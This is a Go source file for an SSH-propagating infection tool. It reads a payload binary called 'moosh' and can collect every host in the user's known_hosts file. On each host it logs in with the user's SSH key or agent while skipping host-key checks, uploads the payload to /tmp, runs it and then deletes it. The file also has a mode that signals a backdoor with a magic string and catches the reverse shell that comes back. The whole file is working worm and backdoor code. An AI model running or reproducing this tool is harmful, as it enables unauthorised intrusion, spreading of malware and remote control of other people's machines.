package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/pkg/errors"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

var MagicNumber = "xVUOcOIljRTgY2MWMK0piQ=="

func init() {
	rand.Seed(time.Now().Unix())
}

type SSHConfig struct {
	AgentSocket string
	PrivateKey  string
	Username    string
	Addr        string
}

type SSHRunner struct {
	*ssh.Client
}

func NewSSHRunner(c SSHConfig) (*SSHRunner, error) {
	var auth []ssh.AuthMethod

	if c.AgentSocket != "" {
		a, err := net.Dial("unix", c.AgentSocket)
		if err != nil {
			return nil, errors.Wrap(err, "failed to connect to SSH agent")
		}
		auth = append(auth, ssh.PublicKeysCallback(agent.NewClient(a).Signers))
	}

	if c.PrivateKey != "" {
		b, err := ioutil.ReadFile(c.PrivateKey)
		if err != nil {
			return nil, errors.Wrap(err, "failed to read private key")
		}

		key, err := ssh.ParsePrivateKey(b)
		if err != nil {
			return nil, errors.Wrap(err, "failed to parse private key")
		}

		auth = append(auth, ssh.PublicKeys(key))
	}

	cl, err := ssh.Dial("tcp", c.Addr, &ssh.ClientConfig{
		Auth:            auth,
		User:            c.Username,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		return nil, errors.Wrap(err, "failed to connect to host via SSH")
	}

	return &SSHRunner{
		Client: cl,
	}, nil
}

func (r SSHRunner) Run(cmd string) error {
	s, err := r.Client.NewSession()
	if err != nil {
		return errors.Wrap(err, "failed to create new SSH session")
	}

	if out, err := s.CombinedOutput(cmd); err != nil {
		return errors.Wrapf(err, "failed to run command, output: %s", out)
	}
	return nil
}

func (r SSHRunner) RunShellCode(b []byte) error {
	cl, err := sftp.NewClient(r.Client)
	if err != nil {
		return errors.Wrap(err, "failed to start SFTP client")
	}

	suf := make([]byte, 5)

	_, err = rand.Read(suf)
	if err != nil {
		return errors.Wrap(err, "failed to generate random bytes")
	}

	path := "/tmp/" + hex.EncodeToString(suf)

	f, err := cl.Create(path)
	if err != nil {
		return errors.Wrapf(err, "failed to create %s", path)
	}

	_, err = f.Write(b)
	if err != nil {
		return errors.Wrapf(err, "failed to write shell code to %s", path)
	}

	if err = f.Chmod(0755); err != nil {
		return errors.Wrapf(err, "failed to chmod 755 %s", path)
	}

	if err = f.Close(); err != nil {
		return errors.Wrapf(err, "failed to close %s", path)
	}

	if err = r.Run(path); err != nil {
		return errors.Wrapf(err, "failed to run shellcode at %s", path)
	}

	if err = cl.Remove(path); err != nil {
		return errors.Wrapf(err, "failed to remove shellcode from %s", path)
	}

	return errors.Wrap(cl.Close(), "failed to close SFTP connection")
}

type Runner interface {
	Run(cmd string) error
}

type ShellCodeRunner interface {
	RunShellCode(b []byte) error
}

func listen(listener net.Listener, wg *sync.WaitGroup) {
	conn, err := listener.Accept()
	if err == nil {
		fmt.Println("Received connection!")
		fmt.Println(conn)

		rawMode := exec.Command("/bin/stty", "-echo", "raw")
		rawMode.Stdin = os.Stdin
		_ = rawMode.Run()

		go func() { io.Copy(conn, os.Stdout) }()
		io.Copy(os.Stdin, conn)

		rawModeOff := exec.Command("/bin/stty", "sane")
		rawModeOff.Stdin = os.Stdin
		_ = rawModeOff.Run()
	}
	wg.Done()
}

func main() {
	var home string

	u, err := user.Current()
	if err != nil {
		log.Println("Failed to get current user: %s", err)
		home = os.Getenv("HOME")
	} else {
		home = u.HomeDir
	}

	knownHosts := filepath.Join(home, ".ssh", "known_hosts")
	sshKey := filepath.Join(home, ".ssh", "id_rsa")
	sshAgent := os.Getenv("SSH_AUTH_SOCK")

	flag.StringVar(&knownHosts, "sshKnown", knownHosts, "Path to SSH known_hosts file")
	flag.StringVar(&sshAgent, "sshAgent", sshAgent, "Path to SSH agent socket")
	flag.StringVar(&sshKey, "sshKey", sshKey, "Path to (passwordless) SSH private key")
	sshUser := flag.String("sshUser", "averagejoe", "Username to connect as(e.g. for SSH)")
	useSSH := flag.Bool("ssh", false, "Use SSH for the infection")
	useSSHAgent := flag.Bool("useSSHAgent", false, "Whether or not use SSH agent")
	useSSHKey := flag.Bool("useSSHKey", false, "Whether or not use (passwordless) SSH private key")
	useKnownHosts := flag.Bool("useSSHKnown", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
	moosh := flag.String("moosh", "./bin/moosh", "Path to moosh")
	addr := flag.String("addr", "", "The lucky guy")
	flag.Parse()

	if *addr == "" && !*useKnownHosts {
		flag.Usage()
		os.Exit(1)
	}

	pld, err := ioutil.ReadFile(*moosh)
	if err != nil {
		log.Fatalf("Failed to read moosh: %s", err)
	}

	switch {
	case *useSSH:
		var addrs []string
		if *addr != "" {
			addrs = append(addrs, *addr)
		}

		if *useKnownHosts {
			b, err := ioutil.ReadFile(knownHosts)
			if err != nil {
				log.Fatalf("Failed to read known_hosts file")
			}

		outer:
			for {
				m, hosts, _, _, rest, err := ssh.ParseKnownHosts(b)
				b = rest

				switch {
				case err == io.EOF:
					break outer
				case err != nil:
					log.Printf("Failed to parse known_hosts file entry: %s", err)
					break outer
				case m == "revoked":
					continue outer
				}

				for _, h := range hosts {
					if !strings.Contains(h, ":") {
						h += ":22"
					}
					addrs = append(addrs, h)
				}
			}
		}

		if len(addrs) == 0 {
			log.Fatal("No hosts to infect")
		}

		conf := SSHConfig{
			Username: *sshUser,
		}
		if *useSSHKey {
			conf.PrivateKey = sshKey
		}
		if *useSSHAgent {
			conf.AgentSocket = sshAgent
		}

		wg := &sync.WaitGroup{}
		for _, a := range addrs {
			wg.Add(1)
			go func(conf SSHConfig, addr string) {
				defer wg.Done()

				conf.Addr = addr

				r, err := NewSSHRunner(conf)
				if err != nil {
					log.Printf("Failed to initialize SSH connection: %s", err)
					return
				}

				log.Printf("Infecting %s...", addr)
				if err = r.RunShellCode(pld); err != nil {
					log.Fatalf("Failed to pwn %s: %s", addr, err)
				}
				log.Printf("%s infected", addr)
			}(conf, a)
		}
		wg.Wait()
	default:
		// TODO: attempt to connect to the backdoor
		// and return the reverse shell
		listener, err := net.Listen("tcp4", "0.0.0.0:0")
		if err != nil {
			log.Fatalf("Failed to open reverse shell: %s", err)
		}
		fmt.Println(listener.Addr())
		wg := &sync.WaitGroup{}
		wg.Add(1)
		go listen(listener, wg)
		conn, err := net.Dial("tcp4", *addr)
		if err != nil {
			log.Fatalf("Failed to open reverse shell: %s", err)
		}
		_, port, _ := net.SplitHostPort(listener.Addr().String())
		conn.Write([]byte(MagicNumber + " " + port))
		wg.Wait()
	}
}
